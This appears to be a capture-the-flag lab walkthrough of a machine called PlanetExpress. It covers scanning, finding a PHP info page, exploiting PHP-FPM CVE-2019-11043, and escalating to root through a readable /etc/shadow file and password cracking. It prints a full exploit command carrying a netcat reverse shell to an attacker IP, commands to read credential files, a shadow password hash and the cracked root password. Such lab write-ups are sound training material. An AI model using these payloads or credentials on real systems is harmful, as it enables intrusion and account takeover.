PlanetExpress

Target IP: 192.168.136.205
Challenge Description: N/A.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.136.205 -p- returns the result shown in the image above. There are three TCP ports open on the target machine.


I ran an aggressive scan against the three TCP ports using the command sudo nmap -sV -A 192.168.136.205 -p 22,80,9000 and obtained the result shown in the iamge above.

Enumeration

Port 80: HTTP

The webpage shown in the image above is returned for this web application. I checked the source-code of the webpage, but I did not find anything useful.


I performed a directory search using the command feroxbuster -u http://192.168.136.205 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,sql -d 4 --scan-dir-listings and obtained the result shown in the image above. There are numerous directories that are interesting to me; for example, the /config/, /plugins/, and /assets/. However, all these returned the HTTP 301 status.


Doing a scan against the /config/ using the command feroxbuster -u http://192.168.136.205/config/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,xml,cfg,yml -d 4 --scan-dir-listings returns the result shown in the image above. There is one file called config.yml.


I browsed to the http://192.168.136.205/config/config.yml and this file was downloaded on my machine. The content of this configuration file is shown in the image above. I notice the debug mode is enabled. Also, there is a custom plugin by the name picoTest that is loaded. From previous enumeration, I identified the directory /plugins/. Maybe I can check there?


And bingo! I browsed to http://192.168.136.205/plugins/PicoTest.php and the webpage shown above was returned to me. This page contains a lot of information about the web application & the server iteself. For example, the server itself is Linux planetexpress 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64. The web application is being served from the directory /var/www/html/planetexpress. The PHP version is 7.3.31-1. I also notice the Server API is FPM/FastCGI. In the past, this is known to be vulnerable to RCE (CVE-2019-11043). The code of the exploit can be found here.

Exploitation

Owning the FPM/FastCGI (CVE-2019-11043)

I started a listener on my machine at port 80. Then I deployed the exploit using the command python3 exp.py 192.168.136.205 /var/www/html/planetexpress/plugins/PicoTest.php -c "<?php passthru('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.206 80 >/tmp/f');?>" -p 9000 | head -n 5. And right away, I obtained a remote shell connection on the bottom terminal as shown in the picture above.

Privilege Escalation & Flags

Vertical Privilege Escalation: User www-data to User root via /usr/sbin/relayd Abuse

Running the command find / -perm -u=s -type f 2>/dev/null returns the result shown in the image above. There is an unusual binary with the name relayd that has SUID bit set. Checking what the binary can do using the command /usr/sbin/relayd --help shows the useful feature with the flag -C to read config files. I searched for all possible config files to read, but I had no luck.


I tried to read the /etc/shadow file, and other sensitive files, using the command /usr/sbin/relayd -C /etc/shadow but the error mesage was returned to me. However, this binary must have been misconfigured incorrectly.


As running the command find / -readable -type f 2>/dev/null returned the result shown in the image above. Somehow, it is possible for me to read the /etc/shadow file.


And bingo. The content of /etc/shadow is shown in the picture above. Now I have the password hash of the user root. I saved the content of both files, /etc/shadow and /etc/passwd, on my machine. Time to unshadow them and crack the hashes. I ran the command unshadow passwd shadow to get the hashes in format. Now I have the content:

astro:$6$3c/stP2hxnireZRa$8Byaa52GnSq5BEVJtCrh2ZAKNSzYRvFuDEb2q2jk8hsJH91qQ6zgtUCxAZ.NgssBCJ7I8DURme/kd7MSkNl5f/:1000:1000::/home/astro:/bin/sh


I tried to crack both hashes, but it was incredibly slow. I tried to speed up the process, but I had no luck. I reduced the hash to crack to only root. And doing so, I successfully obtained the password neverwant2saygoodbye of the user root.


Using the command su root and the password neverwant2saygoodbye, I managed to successfully switch to this user. Now I have a root level access on the target machine. The two flags are also shown in the picture above.
